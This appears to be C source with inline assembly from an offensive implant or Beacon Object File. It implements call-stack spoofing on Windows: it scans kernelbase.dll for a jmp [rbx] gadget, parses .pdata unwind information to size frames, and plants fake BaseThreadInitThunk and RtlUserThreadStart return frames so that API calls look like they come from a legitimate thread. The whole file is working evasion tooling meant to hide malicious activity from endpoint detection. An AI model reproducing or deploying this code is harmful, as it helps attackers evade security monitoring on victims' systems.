#include <windows.h>
#include "tcg.h"
#include "dfr.h"
#include "spoof.h"

/* ── Globals (fixbss-managed via getBSS in services.c) ─────────────── */
u64 g_spoof_btit;   /* BaseThreadInitThunk + 0x14                  */
u64 g_spoof_ruts;   /* RtlUserThreadStart  + 0x21                  */
u64 g_spoof_gadget; /* FF 23 (jmp [rbx]) gadget addr in kernelbase  */
u64 g_btit_offset;  /* [rsp + btit_off] = BTIT                      */
u64 g_ruts_offset;  /* [rsp + ruts_off] = RUTS                      */
u64 g_null_offset;  /* [rsp + null_off] = 0 (stack bottom)          */
u64 g_alloc_size;   /* total bytes to sub from RSP                  */
u64 g_real_ret;     /* saved go() return addr; rbx = &g_real_ret    */

/* ── spoof_call ────────────────────────────────────────────────────────
 *
 * Calls func(a1..a11) with a synthetic call stack:
 *
 *   [rsp+0x00] = gadget (kernelbase!Internal_EnumSystemLocales+406)
 *   [rsp+btit] = BaseThreadInitThunk+0x14
 *   [rsp+ruts] = RtlUserThreadStart+0x21
 *   [rsp+null] = 0
 *
 * Return path: func RET → gadget (FF 23: jmp [rbx]) → [rbx]=g_real_ret
 *              → go() resumes normally.
 *
 * Note: g_real_ret is a single global slot — not re-entrant.           */
__attribute__((naked))
u64
spoof_call(u64 func, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5,
           u64 a6, u64 a7, u64 a8, u64 a9, u64 a10, u64 a11)
{
    __asm__ volatile(
        /* save real return addr; rbx = &g_real_ret for FF 23 gadget */
        "pop    rax\n\t"
        "mov    [rip + g_real_ret], rax\n\t"
        "lea    rbx, [rip + g_real_ret]\n\t"

        /* save func ptr, shift register args */
        "mov    r10, rcx\n\t"
        "mov    rcx, rdx\n\t"
        "mov    rdx, r8\n\t"
        "mov    r8,  r9\n\t"

        /* after pop: a4=[rsp+20h] a5=[rsp+28h] a6=[rsp+30h] ... a11=[rsp+58h] */
        "mov    r9,  [rsp+0x20]\n\t"

        /* save a5..a11 before sub rsp — each push shifts subsequent offsets +8 */
        "mov    rax, [rsp+0x28]\n\t"
        "push   rax\n\t" /* a5  */
        "mov    rax, [rsp+0x38]\n\t"
        "push   rax\n\t" /* a6  */
        "mov    rax, [rsp+0x48]\n\t"
        "push   rax\n\t" /* a7  */
        "mov    rax, [rsp+0x58]\n\t"
        "push   rax\n\t" /* a8  */
        "mov    rax, [rsp+0x68]\n\t"
        "push   rax\n\t" /* a9  */
        "mov    rax, [rsp+0x78]\n\t"
        "push   rax\n\t" /* a10 */
        "mov    rax, [rsp+0x88]\n\t"
        "push   rax\n\t" /* a11 */

        /* allocate fake frame space */
        "mov    r11, [rip + g_alloc_size]\n\t"
        "sub    rsp, r11\n\t"

        /* gadget at [rsp+0x00] — NT func RET lands here */
        "mov    r11, [rip + g_spoof_gadget]\n\t"
        "mov    [rsp], r11\n\t"

        /* copy a5..a11 to their correct positions above the frame
         * saved args sit at [rsp + alloc_size + 0x00..0x30]         */
        "mov    rax, [rip + g_alloc_size]\n\t"
        "mov    r11, [rsp+rax]\n\t"
        "mov    [rsp+0x58], r11\n\t"
        "mov    r11, [rsp+rax+0x08]\n\t"
        "mov    [rsp+0x50], r11\n\t"
        "mov    r11, [rsp+rax+0x10]\n\t"
        "mov    [rsp+0x48], r11\n\t"
        "mov    r11, [rsp+rax+0x18]\n\t"
        "mov    [rsp+0x40], r11\n\t"
        "mov    r11, [rsp+rax+0x20]\n\t"
        "mov    [rsp+0x38], r11\n\t"
        "mov    r11, [rsp+rax+0x28]\n\t"
        "mov    [rsp+0x30], r11\n\t"
        "mov    r11, [rsp+rax+0x30]\n\t"
        "mov    [rsp+0x28], r11\n\t"

        /* plant synthetic frames — written last so arg copies cannot overwrite */
        "mov    r11, [rip + g_spoof_btit]\n\t"
        "mov    rax, [rip + g_btit_offset]\n\t"
        "mov    [rsp+rax], r11\n\t"

        "mov    r11, [rip + g_spoof_ruts]\n\t"
        "mov    rax, [rip + g_ruts_offset]\n\t"
        "mov    [rsp+rax], r11\n\t"

        "xor    r11, r11\n\t"
        "mov    rax, [rip + g_null_offset]\n\t"
        "add    rax, rsp\n\t"
        "mov    [rax], r11\n\t"

        "jmp    r10\n\t");
}

/* ── parse_unwind_alloc ────────────────────────────────────────────────
 * Parse UNWIND_INFO for the function containing func_addr.
 * Returns total RSP bytes allocated by the prologue (PUSH + SUB RSP).
 * Returns 0 on parse failure or frame-pointer functions.              */
static u32 parse_unwind_alloc(u8 *base, u64 func_addr)
{
    u32 e_lfanew = *(u32 *)(base + 0x3C);
    u8 *nt = base + e_lfanew;
    u8 *opt = nt + 0x18;

    u32 pdata_rva = *(u32 *)(opt + 0x78);
    u32 pdata_size = *(u32 *)(opt + 0x7C);
    if (!pdata_rva || !pdata_size)
        return 0;

    u32 *pdata = (u32 *)(base + pdata_rva);
    u32 count = pdata_size / 12;
    u32 rva = (u32)(func_addr - (u64)base);

    u32 lo = 0, hi = count;
    while (lo < hi)
    {
        u32 mid = (lo + hi) / 2;
        u32 begin = pdata[mid * 3 + 0];
        u32 end = pdata[mid * 3 + 1];

        if (begin <= rva && rva < end)
        {
            u32 unwind_rva = pdata[mid * 3 + 2];
            u8 *ui = base + unwind_rva;

            u8 code_count = ui[2];
            u8 frame_reg = ui[3] & 0x0F;
            if (frame_reg != 0)
                return 0;

            u16 *codes = (u16 *)(ui + 4);
            u32 alloc = 0;
            int i;

            for (i = 0; i < (int)code_count; i++)
            {
                u8 op = (codes[i] >> 8) & 0x0F;
                u8 info = (codes[i] >> 12) & 0x0F;

                if (op == 0)
                {
                    alloc += 8; /* UWOP_PUSH_NONVOL  */
                }
                else if (op == 2)
                {
                    alloc += (u32)(info + 1) * 8; /* UWOP_ALLOC_SMALL  */
                }
                else if (op == 1)
                { /* UWOP_ALLOC_LARGE  */
                    if (info == 0)
                    {
                        i++;
                        alloc += (u32)codes[i] * 8;
                    }
                    else
                    {
                        i++;
                        alloc += *(u32 *)(&codes[i]);
                        i++;
                    }
                }
                /* UWOP_SET_FPREG, UWOP_SAVE_NONVOL etc. — no RSP change */
            }
            return alloc;
        }

        if (begin > rva)
            hi = mid;
        else
            lo = mid + 1;
    }
    return 0;
}

/* ── init_spoof ────────────────────────────────────────────────────────
 * 1. Scan kernelbase.dll .text for FF E3 (jmp rbx) or FF 23 (jmp [rbx])
 * 2. Parse .pdata to get the gadget function's frame size (f_gadget)
 * 3. Compute synthetic frame offsets:
 *      btit_off = 8 + f_gadget
 *      ruts_off = btit_off + 8 + sizeof(BTIT frame) [0x20]
 *      null_off = ruts_off + 8 + sizeof(RUTS frame) [0x38]
 * 4. Store all values in globals for spoof_call                       */
void init_spoof(void)
{
    u8 *base = (u8 *)KERNEL32$GetModuleHandleA("kernelbase.dll");
    dprintf("[+] init_spoof: base=0x%llx\n", (u64)base);
    if (!base)
    {
        dprintf("[-] init_spoof: kernelbase not found\n");
        return;
    }

    u32 e_lfanew = *(u32 *)(base + 0x3C);
    u8 *nt = base + e_lfanew;
    u16 n_sections = *(u16 *)(nt + 0x06);
    u16 opt_size = *(u16 *)(nt + 0x14);
    u8 *sections = nt + 0x18 + opt_size;

    u64 gadget = 0;
    u32 f_gadget = 0;
    int s;

    for (s = 0; s < (int)n_sections && !gadget; s++)
    {
        u8 *sec = sections + s * 40;
        u32 chars = *(u32 *)(sec + 36);
        if (!((chars & 0x20) && (chars & 0x20000000)))
            continue;

        u32 vaddr = *(u32 *)(sec + 12);
        u32 vsize = *(u32 *)(sec + 8);
        u8 *ptr = base + vaddr;
        u32 j;

        for (j = 0; j + 1 < vsize; j++)
        {
            if (ptr[j] != 0xFF)
                continue;
            if (ptr[j + 1] != 0xE3 && ptr[j + 1] != 0x23)
                continue;

            u64 cand = (u64)(ptr + j);
            u32 alloc = parse_unwind_alloc(base, cand);
            if (alloc > 0x200)
                alloc = 0x28; /* cap implausible parse results */

            dprintf("[+] init_spoof: gadget 0x%llx bytes %02x %02x alloc=0x%x\n",
                    cand, ptr[j], ptr[j + 1], alloc);

            gadget = cand;
            f_gadget = alloc;
            break;
        }
    }

    if (!gadget)
    {
        dprintf("[-] init_spoof: no gadget found in kernelbase\n");
        return;
    }

    u64 btit_off = 8 + (u64)f_gadget;
    if (btit_off < 0x60)
        btit_off = 0x60; /* must clear all arg slots 0x28-0x58 */

    u64 ruts_off = btit_off + 8 + 0x20;
    u64 null_off = ruts_off + 8 + 0x38;
    u64 alloc_sz = null_off + 8;

    g_spoof_gadget = gadget;
    g_spoof_btit = (u64)KERNEL32$BaseThreadInitThunk + 0x14;
    g_spoof_ruts = (u64)NTDLL$RtlUserThreadStart + 0x21;
    g_btit_offset = btit_off;
    g_ruts_offset = ruts_off;
    g_null_offset = null_off;
    g_alloc_size = alloc_sz;

    dprintf("[+] init_spoof: gadget=0x%llx f_gadget=0x%x btit@+0x%llx ruts@+0x%llx null@+0x%llx\n",
            gadget, f_gadget, btit_off, ruts_off, null_off);
}